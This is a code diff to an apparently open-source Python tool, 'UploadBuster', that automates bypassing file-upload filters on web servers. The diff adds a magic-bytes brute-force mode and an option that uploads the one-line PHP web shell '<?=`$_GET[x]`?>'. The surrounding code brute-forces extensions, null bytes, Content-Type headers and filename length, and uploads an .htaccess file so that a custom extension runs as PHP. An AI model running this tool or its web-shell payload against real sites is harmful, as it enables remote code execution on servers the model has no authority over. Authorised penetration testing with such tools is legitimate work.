@@ -3,6 +3,7 @@ import requests
 import json
 import argparse
 import uuid
+import inspect
 from time import sleep
 
 ___banner = '''
@@ -48,15 +49,21 @@ def args_handler():
     parser.add_argument("-bn", "--bruteforce-null-extension", help='Null Extension Brute forcing.', action='store_true')
     parser.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ',
                         action='store_true')
+    parser.add_argument("-by", "--bruteforce-magic-bytes", help='Magic-bytes Brute forcing. ',
+                        action='store_true')
     parser.add_argument("-bm", "--bruteforce-multi-extension", default=0, type=int, metavar='',
                         help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-bm [3] = jpg.php.php.php) ', )
     parser.add_argument("-bl", "--bruteforce-filename-limit", help='Content-Type field Brute forcing. ',
                         action='store_true')
+    parser.add_argument("-db", "--dont-brute", action='store_true',
+                        help='if success message is found stop all tests. ')
+
+    # tech
+    parser.add_argument("-ts", "--tech-short-payload", action='store_true',
+                        help='Try to set the shortest known php payload [<?=`$_GET[x]`?>]')
     parser.add_argument("-te", "--tech-execution-extension",
                         help='Try to edit .htaccess so it would treat extension as a php file extension. ',
                         action='store_true')
-    parser.add_argument("-db", "--dont-brute", action='store_true',
-                        help='if success message is found stop all tests. ')
 
     # print args
     parser.add_argument("-vi", "--print-i", help="print the Request", action='store_true')
@@ -92,27 +99,28 @@ class UploadBuster:
         self.request_time_out = self.args.request_time_out
 
         # payload data
-        self.payload = dict()
         self.payload_upload_variable = self.args.upload_variable
         self.payload_file_name = str()
         self.payload_file_ext = str()
         self.payload_filename_full = self.payload_file_name + self.args_backend
         self.payload_content_type = str()
+        self.payload_data = str()
 
         # response
         self.response_success_message_line = str()
 
         # etc
         self.lst = [str.upper, str.lower]
+        self._mode_name = str()
 
     # settings
-    def _change_payload_file_name(self, _new: str):
+    def _set_payload_file_name(self, _new: str):
         self.payload_file_name = _new
 
-    def _change_payload_file_ext(self, _new: str):
+    def _set_payload_file_ext(self, _new: str):
         self.payload_file_ext = _new
 
-    def _change_payload_content_type(self, _new: str):
+    def _set_payload_content_type(self, _new: str):
         self.payload_content_type = _new
 
     def _set_request_time_out(self, _new: int):
@@ -158,59 +166,68 @@ class UploadBuster:
         print(f"[+] Executing Bruteforce filename extension")
         for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
             self._add_random_lower_and_upper_case_ext()
-            self._send_formated_request_print()
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _bruter_null_file_ext(self):
         print(f"[+] Executing Bruteforce Null filename extension")
         for self.payload_file_ext in self._configuration['exts']["null"]:
-            self._change_payload_file_ext("." + self.args_backend + self.payload_file_ext)
-            self._send_formated_request_print()
+            self._set_payload_file_ext("." + self.args_backend + self.payload_file_ext)
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _bruter_multi_ext(self):
         print(f"[+] Executing Bruteforce filename extension")
         for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
             _temp = self.payload_file_ext
             for _loops in range(1, 8):
-                self._change_payload_file_ext(self.payload_file_ext + _temp)
-                self._send_formated_request_print()
+                self._set_payload_file_ext(self.payload_file_ext + _temp)
+                self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _bruter_filename_limit(self):
         print(f"[+] Executing Break filename length limit")
         for _index in range(999):
-            self._change_payload_file_name(self.args.payload + (_index * "A"))
-            self._send_formated_request_print()
+            self._set_payload_file_name(self.args.payload + (_index * "A"))
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _bruter_content_type(self):
         print(f"[+] Executing Bruteforce Content-type header")
         for self.payload_content_type in self._configuration['content_types']:
-            self._change_payload_file_ext("." + self.args_backend)
-            self._send_formated_request_print()
+            self._set_payload_file_ext("." + self.args_backend)
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
+
+    def _bruter_magic_bytes(self):
+        print(f"[+] Executing Bruteforce Content-type header")
+        for _magic_bytes_extension in self._configuration['magic_bytes']:
+            for _magic_bytes in self._configuration['magic_bytes'][_magic_bytes_extension]:
+                self._set_payload_data(str(bytes.fromhex(_magic_bytes)).replace("b'", "")[0:-1]+"\n<?php echo HelloWorld;?>")
+                self._set_payload_file_ext(".php")
+                self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     # tech
     def _tech_add_execution_extension(self):
         print(f"[+] Executing add extension to .htaccess settings")
 
         def upload_htaccess():
-            self._change_payload_file_name(".htaccess")
-            self._change_payload_file_ext("")
-            self._change_payload_content_type("application/x-php")
+            self._set_payload_file_name(".htaccess")
+            self._set_payload_file_ext("")
+            self._set_payload_content_type("application/x-php")
             self.args_user_payload_file_name = ".htaccess"
-            self._send_formated_request_print()
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
         def upload_new_payload():
             self._add_random_file_name_to_payload()
-            self._change_payload_file_ext(".hph")
-            self._change_payload_content_type("application/x-php")
+            self._set_payload_file_ext(".hph")
+            self._set_payload_content_type("application/x-php")
             self.args_user_payload_file_name = self.args.payload
-            self._send_formated_request_print()
+            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
         upload_htaccess()
         upload_new_payload()
 
+    # core
     def _tech_short_php_payload(self):
         self._set_payload_data("<?=`$_GET[x]`?>")
-        self._change_payload_file_ext(".php")
-        self._send_formated_request_print()
+        self._set_payload_file_ext(".php")
+        self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _refresh_format(self):
         self.request_files.update({self.payload_upload_variable: (self.payload_file_name + self.payload_file_ext,
@@ -225,7 +242,7 @@ class UploadBuster:
                                      allow_redirects=True)
         sleep(self.args_delay)
 
-    def _print_init(self):
+    def _print_init(self, _mode: str = None):
         if self._if_success() and self.args.verbal_success:
             pass
             print(f'[+] Success message found!')
@@ -234,7 +251,8 @@ class UploadBuster:
         if self.args.print_o:
             print(f'POST {self.request_url}\n{self.request_headers}\n{self.request.text} ')
         if self.args.print:
-            print(f'''> Payload:
+            print(f'''> Mode: {_mode}
+    Payload:
         > URL: {self.request_url}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
         > HEADERS: {self.request_headers}
@@ -257,10 +275,10 @@ class UploadBuster:
         else:
             return False
 
-    def _send_formated_request_print(self):
+    def _send_formatted_request_print(self, _mode):
         self._refresh_format()
         self._send_post_request()
-        self._print_init()
+        self._print_init(_mode)
 
     def main(self):
 
@@ -270,12 +288,12 @@ class UploadBuster:
             self._add_random_file_name_to_payload()
             self._add_data_to_request()
 
+            if self.args.tech_short_payload:
+                self._tech_short_php_payload()
+
         main_init()
         if self.args.bruteforce_extension:
             self._bruter_file_ext()
-
-        if self.args.bruteforce_content_type:
-            self._bruter_content_type()
 
         if self.args.bruteforce_filename_limit:
             self._bruter_filename_limit()
@@ -286,13 +304,20 @@ class UploadBuster:
         if self.args.bruteforce_null_extension:
             self._bruter_null_file_ext()
 
+        if self.args.bruteforce_magic_bytes:
+            self._bruter_magic_bytes()
+
+        if self.args.bruteforce_content_type:
+            self._bruter_content_type()
+
         elif self.args.all_tests:
-            print("[+] Executing All tests ")
+            print("[+] Executing All tests")
             self._tech_add_execution_extension()
             # self._tech_short_php_payload()
             self._bruter_file_ext()
             self._bruter_null_file_ext()
             self._bruter_multi_ext()
+            self._bruter_magic_bytes()
             self._bruter_content_type()
             self._bruter_filename_limit()
 
